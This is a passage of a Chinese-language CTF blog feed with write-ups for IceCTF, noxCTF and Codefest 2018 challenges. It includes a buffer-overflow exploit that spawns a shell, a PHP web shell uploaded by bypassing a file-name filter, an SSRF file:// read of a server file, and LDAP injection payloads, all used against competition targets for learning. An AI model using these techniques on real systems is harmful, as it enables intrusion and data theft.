class="keyword">char</span> *input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The cave echoes.. %s\n"</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        message(argv[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: ./shout &lt;message&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>shout</code>文件信息，经过测试，先试试<code>200</code>个随机字符串，由<code>cyclic 200</code>生成</p><p><img src="/2018/09/18/Icectf2018-writeup/1536673986824.png" alt="1536673986824"></p><p>尝试 <code>run 200 字符串</code>，得到以下结果</p><p><img src="/2018/09/18/Icectf2018-writeup/1536674105104.png" alt="1536674105104"></p><p>可以发现溢出结果为<code>0x61616168</code>，命令执行<code>cyclic -l 0x61616168</code>下为数值<code>28</code>。</p><p>再打开<code>ida</code>分析下</p><p><img src="/2018/09/18/Icectf2018-writeup/1536674627177.png" alt="1536674627177"></p><p><code>Fn+f5</code>下查看反汇编代码</p><p><img src="/2018/09/18/Icectf2018-writeup/1536674561868.png" alt="1536674561868"></p><p>找到<code>sheel</code>函数的地址，<code>0X0804850B</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536674710456.png" alt="1536674710456"></p><p>最后构造下<code>exp</code>：<code>./shout $(python -c &#39;print &quot;a&quot;*28 + &quot;\x0b\x85\x04\x08&quot;&#39;)</code></p><p>成功得到<code>flag</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536674891630.png" alt="1536674891630"></p><p>最终答案：<code>IceCTF{i_dont_think_cavemen_overflowed_buffers}</code></p><p>以下是自己在本地的测试</p><p>此题，在没有<code>SCP</code>得到<code>shout</code>的文件时，自己通过源码<code>shout.c</code>执行命令<code>gcc -m32 -fno-stack-protector shout.c -o shout</code>得到了本地构造的<code>shout</code></p><p>对比下<code>ida</code>中的差异，左边是题目的源文件，右边是自己构造的</p><p><img src="/2018/09/18/Icectf2018-writeup/1536675331997.png" alt="1536675331997"></p><p>发现自己构造的，执行函数地址或者<code>&quot;/bin/sh -i&quot;</code>地址均可拿到权限，而比赛原题文件只能溢出后执行函数地址<code>0x0804850B</code>。以下是<code>ida</code>中函数地址和<code>&quot;/bin/sh -i&quot;</code>地址：</p><p><code>.text:0804850B                 public shell</code></p><p>……..</p><p><code>.text:08048530                 push    offset command  ; &quot;/bin/sh -i&quot;</code></p><p>本地构造的可行<code>exp</code>：</p><p><code>./shout $(python -c &#39;print &quot;a&quot;*28+&quot;\x0b\x85\x04\x08&quot;&#39;)</code></p><p><code>./shout $(python -c &#39;print &quot;a&quot;*28+&quot;\x30\x85\x04\x08&quot;&#39;)</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536675621709.png" alt="1536675621709"></p><p>原赛题的可行<code>exp</code>:<code>./shout $(python -c &#39;print &quot;a&quot;*28 + &quot;\x0b\x85\x04\x08&quot;&#39;)</code></p><p>未完待续。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是场长知识的比赛，持续了&lt;code&gt;7&lt;/code&gt;天，贼好玩，最大的收获:让我提起了对二进制方向学习的兴致。此篇，容我慢慢分析，后续慢慢更新，这个比赛是入门&lt;code&gt;pwn&lt;/code&gt;的绝佳学习机会。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>noxCTF2018 web解析</title>
    <link href="https://jianghuxia.github.io/2018/09/10/noxCTF2018-web%E8%A7%A3%E6%9E%90/"/>
    <id>https://jianghuxia.github.io/2018/09/10/noxCTF2018-web解析/</id>
    <published>2018-09-10T11:56:35.000Z</published>
    <updated>2018-09-10T12:39:56.949Z</updated>
    
    <content type="html"><![CDATA[<p>额~菜鸡一枚，五题只做出四题，感觉学到了新知识，写了下writeup。</p><a id="more"></a> <h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h5><p><code>What is your reference again?</code></p><p><a href="http://chal.noxale.com:5000" target="_blank" rel="noopener">http://chal.noxale.com:5000</a></p><p>打开网页，如下页面</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494190208.png" alt="1536494190208"></p><p>查看源代码，发现其中的<code>&lt;script src=&quot;js/index.js&quot;&gt;&lt;/script&gt;</code>，点进去</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494331902.png" alt="1536494331902"></p><p>嗯接着访问下，发现新的页面，抓包分析，添上头<code>Referer: http://google.com</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494546331.png" alt="1536494546331"></p><p>解码得到<code>flag</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494580454.png" alt="1536494580454"></p><p>最终答案：<code>noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}</code></p><h5 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h5><p><code>This is my new file uploader server. I bet you can&#39;t hack it!</code></p><p><a href="http://chal.noxale.com:8079" target="_blank" rel="noopener">http://chal.noxale.com:8079</a></p><p>是个上传题，写了个<code>shell.txt</code>，内容为&lt;?php system($_GET[‘cmd’]); ?&gt;，尝试上传</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494868896.png" alt="1536494868896"></p><p><code>There is no .png/.jpg/.gif in that file name</code> ，尝试抓包改<code>Content-Type:image/png</code> ，发现无果。<img src="/2018/09/10/noxCTF2018-web解析/1536495853127.png" alt="1536495853127"></p><p>再改名称为<code>filename=&quot;shell.png.txt&quot;</code>，成功上传，但是发现无法解析</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536495147596.png" alt="1536495147596"></p><p>再改名称为<code>filename=&quot;shell.png.php&quot;</code>,上传的路径为<code>&#39;uploads/shell.png&#39;</code>，可见过滤到<code>.php</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536495949702.png" alt="1536495949702"></p><p>再改名称为<code>filename=&quot;shell.png.php.php&quot;</code>，成功解析</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536495398824.png" alt="1536495398824"></p><p>执行命令，<code>ls%20-la</code>，发现了个<code>7H3-FL4G-1S-H3r3</code>，<code>root</code>权限</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536495648131.png" alt="1536495648131"></p><p>再来一次命令：<code>ls%207H3-FL4G-1S-H3r3</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536496241737.png" alt="1536496241737">最终答案：<code>noxCTF{N3V3R_7RU57_07H3R5}</code></p><h5 id="hiddenDOM"><a href="#hiddenDOM" class="headerlink" title="hiddenDOM"></a>hiddenDOM</h5><p><code>I decided to create a tool that searches for</code><br><code>hidden elements inside a web pages.</code><br><code>Few days ago someone told me that my website is not so /secure/...</code><br><code>Can you check it yourself ?</code></p><p><a href="http://13.59.2.198:5588" target="_blank" rel="noopener">http://13.59.2.198:5588</a></p><p>此题说来，不算难，非常类似<code>LCTF2017</code>的签到题（别问我怎么知道，那个时候连<code>LCTF2017</code>的签到题都没做出来,印象特深），但又添加了其他的知识点，添加了题目的脑洞性（趣味性）。先放出<code>LCTF2017</code>签到题的wrtieup</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536581827700.png" alt="1536581827700"></p><p>en~就是这么简单。</p><p>打开网页，发现了一些可疑之处，可以查看网页源代码部分，或者查看控制台。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536498304037.png" alt="1536498304037"></p><p>其中js代码为以下，还给了个<code>&lt;a href=&#39;/var/www/html/flag.txt&#39; hidden&gt;-_-&lt;/a&gt;</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x3bc3=[<span class="string">"\x6D\x61\x69\x6E\x5F\x66\x6F\x72\x6D"</span>,<span class="string">"\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"</span>,<span class="string">"\x69\x6E\x70\x75\x74"</span>,<span class="string">"\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"</span>,<span class="string">"\x6E\x61\x6D\x65"</span>,<span class="string">"\x65\x78\x70\x72\x65\x73\x73\x69\x6F\x6E"</span>,<span class="string">"\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65"</span>,<span class="string">"\x74\x79\x70\x65"</span>,<span class="string">"\x74\x65\x78\x74"</span>,<span class="string">"\x70\x6C\x61\x63\x65\x68\x6F\x6C\x64\x65\x72"</span>,<span class="string">"\x2F\x3C\x5B\x5E\x3C\x3E\x5D\x7B\x31\x2C\x7D\x68\x69\x64\x64\x65\x6E\x5B\x5E\x3C\x3E\x5D\x7B\x31\x2C\x7D\x3E\x2F"</span>];<span class="keyword">var</span> _frss=<span class="built_in">document</span>[_0x3bc3[<span class="number">1</span>]](_0x3bc3[<span class="number">0</span>]);<span class="keyword">var</span> _xEger=<span class="built_in">document</span>[_0x3bc3[<span class="number">3</span>]](_0x3bc3[<span class="number">2</span>]);_xEger[_0x3bc3[<span class="number">6</span>]](_0x3bc3[<span class="number">4</span>],_0x3bc3[<span class="number">5</span>]);_xEger[_0x3bc3[<span class="number">6</span>]](_0x3bc3[<span class="number">7</span>],_0x3bc3[<span class="number">8</span>]);_xEger[_0x3bc3[<span class="number">6</span>]](_0x3bc3[<span class="number">9</span>],_0x3bc3[<span class="number">10</span>])</span><br></pre></td></tr></table></figure><p>尝试<code>16</code>进制解码下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _frss = <span class="built_in">document</span>[<span class="string">'getElementById'</span>](<span class="string">'main_form'</span>);</span><br><span class="line"><span class="keyword">var</span> _xEger = <span class="built_in">document</span>[<span class="string">'createElement'</span>](<span class="string">'input'</span>);</span><br><span class="line">_xEger[<span class="string">'setAttribute'</span>](<span class="string">'name'</span>, <span class="string">'expression'</span>);</span><br><span class="line">_xEger[<span class="string">'setAttribute'</span>](<span class="string">'type'</span>, <span class="string">'text'</span>);</span><br><span class="line">_xEger[<span class="string">'setAttribute'</span>](<span class="string">'placeholder'</span>, <span class="string">'/&lt;[^&lt;&gt;]&#123;1,&#125;hidden[^&lt;&gt;]&#123;1,&#125;&gt;/'</span>)</span><br></pre></td></tr></table></figure><p>em~，好像隐藏了什么东西，算了，先控制台调试下</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536498717396.png" alt="1536498717396"></p><p>发现调试<code>_xEger</code>的时候，有</p><input name="expression" type="text" placeholder="/<[^<>]{1,}hidden[^<>]{1,}>/"><p>经过各种调试，可以发现，<code>expression</code>这个控制了回显数据的完整性。</p><p>咯，我们测试一下，先提交<code>http://13.59.2.198:5588/index.php?target=http://13.59.2.198:5588</code>，发现是隐藏的</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499133177.png" alt="1536499133177"></p><p>再提交<code>http://13.59.2.198:5588/index.php?target=http://13.59.2.198:5588&amp;expression=/.*/</code>，发现成功显示出所有源代码。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499252455.png" alt="1536499252455"></p><p>好了，是不是有点奇怪得到这些，我们能干嘛呢？其实这题还考察了关于<code>ssrf</code>相关的知识，<code>file</code>、<code>http</code>、<code>ftp</code>的应用。是的，你猜的没错，前面源代码提示的<code>&lt;a href=&#39;/var/www/html/flag.txt&#39; hidden&gt;-_-&lt;/a&gt;</code>，这个链接是打不开的。这里额外分析下，<code>ssrf</code>的相关知识点，一般需要通过一些协议比如：<code>ftp://</code>、<code>ssh://</code>、<code>dict://</code>、<code>gopher://</code>、<code>file://</code>等获取<code>shell</code>或者一些敏感信息，此处非常这明显，<code>flag.txt</code>我们打不开，但是又给了目录，所以通过<code>file</code>协议读取成为解题的关键步骤</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499630823.png" alt="1536499630823"></p><p>这里我们用<code>file</code>协议去读<code>flag</code>的目录，构造<code>http://13.59.2.198:5588/index.php?target=file:///var/www/html/flag.txt</code>，发现是空的</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499781263.png" alt="1536499781263"></p><p>通过上面的分析，我们再次构造，后面加上个<code>&amp;expression=/.*/</code>，得到<code>flag</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499736586.png" alt="1536499736586"></p><p>最终答案：<code>noxCTF{/[h1DD3N]*[55Rf]*[r393X]*/}</code></p><h5 id="Dictionary-of-obscure-sorrows"><a href="#Dictionary-of-obscure-sorrows" class="headerlink" title="Dictionary of obscure sorrows"></a>Dictionary of obscure sorrows</h5><p><code>There are a lot of obscure sorrows in our world.</code><br><code>Your job is not to find those that are plain in sight;</code><br><code>You need to seek further, look deeper.</code><br><code>Find the word that can not be written.</code><br><code>The most obscure sorrow of them all.</code></p><p><a href="http://54.152.220.222/" target="_blank" rel="noopener">http://54.152.220.222/</a></p><p>这题，先说说感受吧。感觉、有点小难度，但是可以通过学习，得到题解，关键是这次是我第一次玩LDAP注入，这种注入，感觉国内<code>ctf</code>赛事，考察的不是很多。</p><p>打开链接，呈现以下网页。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539086827.png" alt="1536539086827"></p><p>手工<code>fuzz</code>一番，发现无果。御剑、<code>awvs</code>扫一番，<code>awvs</code>倒是有一些线索，发现了<code>word.php</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539324248.png" alt="1536539324248"></p><p>再仔细查看了下网页的源代码，发现下面也有这些，是不是大惊小怪了？</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539474274.png" alt="1536539474274"></p><p>难道是<code>word.php</code>存在<code>sql</code>注入？测试一波无果，但是接下来的发现，让我有了其他想法。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539685160.png" alt="1536539685160"></p><p>提示<code>Missing RDN inside ObjectClass(document)</code>,网上搜索一番</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536547256883.png" alt="1536547256883"></p><p>许多词条都含有关键词<code>LDAP</code>，搜索一番，学习了下<a href="http://blog.51cto.com/407711169/1439623" target="_blank" rel="noopener">LDAP基础概念</a>（此处认真，仔细查看，否则后面看不懂）。再搜索一番<code>LDAP</code>的安全问题，其中查询到<code>LDAP</code>注入（菜鸡我第一次听到），继续搜索资料，找到<a href="https://oav.net/mirrors/LDAP-ObjectClasses.html" target="_blank" rel="noopener">LDAP ObjectClasses</a>，其中有</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536563809489.png" alt="1536563809489"></p><p>再回头看看刚刚的</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539685160.png" alt="1536539685160"></p><p>所以我们知道了<code>ObjectClass</code>是 <code>document</code>，又因为属于<code>document</code>的有<code>11</code>种</p><ul><li><code>commonName</code></li><li><code>description</code></li><li><code>seeAlso</code></li><li><code>l</code></li><li><code>o</code></li><li><code>ou</code></li><li><code>documentTitle</code></li><li><code>documentVersion</code></li><li><code>documentAuthor</code></li><li><code>documentLocation</code></li><li><code>documentPublisher</code></li></ul><p>测试一番发现，<code>http://54.152.220.222/word.php?page=*)(|(no=*)</code>，回显页面如下</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536565484665.png" alt="1536565484665"></p><p>而<code>http://54.152.220.222/word.php?page=*)(|(seeAlso=*)</code>也是同样的<code>Query returned empty</code>，接下来的剩下的几种依次带进去，发现只有<code>documentAuthor</code>、<code>description</code>是正常的回显。</p><p>而我们又知道flag的格式是<code>noxCTF{}</code>。再通过网上搜索学习，学习了有关的<code>LDAP</code>注入的姿势，这里放出一道跟本题十分相似的<a href="http://www.networkdls.com/articles/ldapinjection.pdf" target="_blank" rel="noopener">链接</a>，其中有以下页面</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536561851198.png" alt="1536561851198"></p><p>模仿构造<code>http://54.152.220.222/word.php?page=*)(|(description=noxCTF*)</code>,可以得到<code>flag</code>。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536549649887.png" alt="1536549649887">当然，也可以构造<code>http://54.152.220.222/word.php?page=*)(description=noxCTF*</code>,得到<code>flag</code>。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536549750782.png" alt="1536549750782"></p><p>最终答案：<code>noxCTF{K1NG_0F_LD4P}</code>    </p><p>此题相关资料链接：</p><p><a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">技术详解：基于Web的LDAP注入漏洞</a></p><p>Testing for LDAP Injection (OTG-INPVAL-006)：<br><code>https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)</code></p><h5 id="PSRF（未解决）"><a href="#PSRF（未解决）" class="headerlink" title="PSRF（未解决）"></a>PSRF（未解决）</h5><p><code>Swisslock is a new company in the Kubernetes security business.</code><br><code>Are they worth it?</code></p><p><a href="http://35.241.245.36" target="_blank" rel="noopener">http://35.241.245.36</a></p><p>打开是这么一个页面</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536560866989.png" alt="1536560866989"></p><p>测试</p><p>它将发送一个HTTP的<code>GET</code>请求 <code>http://35.241.245.36/api/v1/upload?url=http://your_url&amp;method=get</code><br>，它会返回一个图像名称，并且<code>SSRF</code>的结果将存储在<code>http://35.241.245.36/images/</code></p><p>挑战在页面底部有<code>kubernetes</code>徽标，如下面的屏幕截图，<code>IP</code>为<code>35.241.245.36</code>。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536561406912.png" alt="1536561406912"></p><p>后面没测试出啥。。本题未解出。</p><p>此处有国外大佬的另类解法，觉得会影响到使用docker容器配置的比赛环境（<code>orz</code>）</p><p><a href="https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn" target="_blank" rel="noopener">https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;额~菜鸡一枚，五题只做出四题，感觉学到了新知识，写了下writeup。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Codefest2018 CTF 部分题目writeup</title>
    <link href="https://jianghuxia.github.io/2018/09/03/Codefest2018-CTF/"/>
    <id>https://jianghuxia.github.io/2018/09/03/Codefest2018-CTF/</id>
    <published>2018-09-02T16:11:04.000Z</published>
    <updated>2018-09-02T16:16:31.746Z</updated>
    
    <content type="html"><![CDATA[<p>实在是太无聊了，找了找比赛打，Codefest2018这个感觉跟以往的ctf比赛不同，感觉更偏向代码能力的考查，以下是这次自己做出来的题目writeup，菜鸡一枚。</p><a id="more"></a> <h4 id="Freebies"><a href="#Freebies" class="headerlink" title="Freebies"></a>Freebies</h4><p><strong>problem</strong></p><p>This one’s simple. Join the <a href="https://www.hackerrank.com/external_redirect?to=https://join.slack.com/t/codefest-ctf-18/shared_invite/enQtNDI2MjY1NDcyNDA2LTdiNTczZWUxMjJkZWUwMmQ5MTIxNzMzNDMwMjU5ZTU5MWFlYzU1MjY0MTE2NWI4ZTEyMWFkMTNlYzg3MTAxMTQ" target="_blank" rel="noopener">Slack channel</a> to get the flag.</p><p>这题算是签到题，但也是寻找了好一番，就不放答案了</p><h4 id="Fortune-Cookie"><a href="#Fortune-Cookie" class="headerlink" title="Fortune Cookie"></a>Fortune Cookie</h4><p><strong>problem</strong></p><p>H4k3r has heard that there is a secret hidden behind this <a href="https://www.hackerrank.com/external_redirect?to=http://34.216.132.109:8084/" target="_blank" rel="noopener">website</a>, but he is confused as to how to get access to it. Can you help him</p><p>这题，呃，很简单，该下cookies(说着简单，最后试了半天才发现是admin，不是Admin)</p><p><img src="/2018/09/03/Codefest2018-CTF/1535766037090.png" alt="1535766037090"></p><p><code>Who are you?=admin</code>即可</p><p><img src="/2018/09/03/Codefest2018-CTF/1535766076578.png" alt="1535766076578"></p><h4 id="Typing-Master"><a href="#Typing-Master" class="headerlink" title="Typing Master"></a>Typing Master</h4><p><strong>problem</strong></p><p>If you think you have it in you, connect now to 34.216.132.109 9093 and prove your mettle.</p><p>You will be presented with a simple typing task which is meant to check your typing speed.</p><p>For example, <em>Can you type ‘Z’ 10 times followed by ‘u’ 6 times, followed by the sum of their ASCII values?</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZZZZZZZZZZuuuuuu207</span><br></pre></td></tr></table></figure><p><strong>Input Format</strong></p><p><strong>Regarding input to the server</strong> - The question was designed keeping netcat in mind. Some users who are using other tools/language (eg, Python, PuTTY, TELNET) to connect to the server please note that they do not terminate the strings like netcat does. If you choose not to use netcat, the message you send to our server should terminate with a trailing newline (‘\n’) and nothing else.</p><p>nc下,先看看大概是啥样子的</p><p><img src="/2018/09/03/Codefest2018-CTF/1535879235703.png" alt="1535879235703"></p><p>发现每次访问，要求的都不一样，甚至返回的字符串也不一样，想了想，觉得还是一个脚本的事，需要正则一下即可</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line">conn=remote(<span class="string">'34.216.132.109'</span>,<span class="number">9093</span>)</span><br><span class="line">text=conn.recv()</span><br><span class="line"><span class="keyword">print</span> text</span><br><span class="line"></span><br><span class="line">result = re.findall(<span class="string">r"'(\w)' (\d*)"</span>, text)</span><br><span class="line"><span class="comment">#print result</span></span><br><span class="line"><span class="comment">#print result[0][0]</span></span><br><span class="line"><span class="comment">#print result[0][1]</span></span><br><span class="line"></span><br><span class="line">str1=(result[<span class="number">0</span>][<span class="number">0</span>] * int(result[<span class="number">0</span>][<span class="number">1</span>]))</span><br><span class="line">str2=(result[<span class="number">1</span>][<span class="number">0</span>] * int(result[<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line">str3=(str(ord(result[<span class="number">0</span>][<span class="number">0</span>]) +  ord(result[<span class="number">1</span>][<span class="number">0</span>])))</span><br><span class="line">S = <span class="string">''</span>.join(str1+str2+str3)</span><br><span class="line"><span class="keyword">print</span> S</span><br><span class="line"></span><br><span class="line">conn.sendline(S)</span><br><span class="line"><span class="keyword">print</span> conn.recv()</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2018/09/03/Codefest2018-CTF/1535879374237.png" alt="1535879374237"></p><p>最终答案：<code>CodefestCTF{1_s33_y0u_4r3_a_m4n_0f_sp33d}</code></p><h4 id="Web-BooK"><a href="#Web-BooK" class="headerlink" title="Web BooK"></a>Web BooK</h4><p><strong>problem</strong></p><p>It is expected to complete reading a book/novel to pass the course, but the students being clever avoid reading the whole book by going through the summary only.  Santosh(their course teacher) comes up with a new idea, he creates a magic book (you can only go to next page, that is: you can’t go to next page without reading the previous one and so on, and you can only start from the beginning).  It is know that the flag is hidden somewhere in the book, so the only way to pass the course is to read the whole book, find the flag. The book has 1000 pages so better be fast. And if you are lucky, you may even find the key on the very first page itself.  <a href="https://www.hackerrank.com/external_redirect?to=http://34.216.132.109:8083/fp/" target="_blank" rel="noopener">link to Web_BooK</a></p><p>打开网站，发现如下页面，点击next发现，都是没有规则的url</p><p><img src="/2018/09/03/Codefest2018-CTF/1535877269304.png" alt="1535877269304"></p><p>没办法，只能简单爬虫脚本写下，源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://34.216.132.109:8083'</span></span><br><span class="line">page = <span class="string">'/fp/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">True</span>):</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    r = s.get(url + page)</span><br><span class="line">    page_text = r.text</span><br><span class="line">    <span class="keyword">print</span> page_text</span><br><span class="line">    page = re.findall(<span class="string">'action="(.*?)"'</span>, page_text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> page, counter</span><br></pre></td></tr></table></figure><p>运行下</p><p><img src="/2018/09/03/Codefest2018-CTF/1535877528777.png" alt="1535877528777"></p><h4 id="Access-Denied"><a href="#Access-Denied" class="headerlink" title="Access Denied?"></a>Access Denied?</h4><p><strong>problem</strong></p><p>A school IT staff manages access to secure files by the method of access code. You are required to give your name and the access code, and the program will give out secret information.</p><p>It checks whether you already have an access code, generates new random one along with a new user ID alloted to the user, if that user is not found locally on the system. The access codes are known to have random expiration time (don’t know what goes on in their minds!), so don’t be surprised if you generated an access code just seconds ago and next time the same access code doesn’t work.</p><p>Johnny decided to go into the IT room and copy the program into his pendrive. You can find it <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/open?id=1KGoBbSNViJS8aZsh1Jjp8XbESv0E-Z4t" target="_blank" rel="noopener">here</a>.</p><p>Can you get the secret information out from the program? The service runs on 34.216.132.109 on port 9094.</p><p><strong>Constraints</strong></p><p>User ID / UID will be a positive integer</p><p>这题给了个school.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> user_functions</span><br><span class="line"></span><br><span class="line">user = raw_input(<span class="string">"Enter your name: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> user_functions.exists(user):</span><br><span class="line"><span class="comment"># generate a code</span></span><br><span class="line"></span><br><span class="line">count_ = user_functions.generateID(user)%<span class="number">1000</span><span class="comment">#User ID/ UID in the table is always positive</span></span><br><span class="line"></span><br><span class="line">generator = <span class="string">"xorshift"</span></span><br><span class="line">random.seed(generator)</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> user:</span><br><span class="line">ra = random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line">rb = (ord(ch) * random.randint(<span class="number">1</span>, len(user))) ^ random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line"></span><br><span class="line">count += (ra + rb)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count+count_):</span><br><span class="line">code = (code + random.randint(<span class="number">1</span>, i) ) % <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line">final = random.randint(<span class="number">1</span>,<span 